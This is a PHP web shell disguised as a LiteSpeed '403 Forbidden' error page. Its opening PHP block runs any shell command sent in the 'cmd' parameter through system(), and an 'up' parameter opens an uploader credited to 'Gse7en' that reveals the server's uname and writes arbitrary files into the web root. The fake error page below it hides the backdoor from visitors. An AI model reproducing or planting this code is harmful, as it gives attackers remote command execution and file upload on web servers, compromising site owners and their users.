<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
if (isset($_REQUEST['up'])) { echo "<i>Uploader By Gse7en<br>";
 echo "<b>".php_uname()."</b><br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='idx_file'> <input type='submit' name='upload' value='upload'> </form>"; $root = $_SERVER['DOCUMENT_ROOT'];
 $files = $_FILES['idx_file']['name'];
 $dest = $root.'/'.$files; if(isset($_POST['upload'])) { if(is_writable($root)) { if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { $web = "http://".$_SERVER['HTTP_HOST']."/";
 echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>"; } else { echo "gagal upload di document root.";
 } } else { if(@copy($_FILES['idx_file']['tmp_name'], $files)) { echo "sukses upload <b>$files</b> di folder ini";
 } else { echo "gagal upload"; } } } }
 ?>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 403 Forbidden
</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
<h2 style="margin-top:20px;font-size: 30px;">Forbidden
</h2>
<p>Access to this resource on the server is denied!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
